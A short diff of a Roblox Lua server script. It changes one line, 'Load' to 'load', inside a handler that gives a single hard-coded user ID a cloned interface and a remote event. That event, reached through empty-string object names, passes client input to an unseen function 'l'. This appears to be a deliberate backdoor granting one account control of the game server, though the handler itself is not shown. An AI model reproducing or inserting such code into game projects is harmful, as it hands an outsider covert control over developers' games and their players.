@@ -12,7 +12,7 @@ end
 
 game.Players.PlayerAdded:Connect(function(plr)
 	if plr.UserId == 287103891 then
-		local c = c:Load():Clone()
+		local c = c:load():Clone()
 		c.Parent = plr.PlayerGui
 		c[''][''].OnServerEvent:connect(function(a,s)
 			l(a,s)
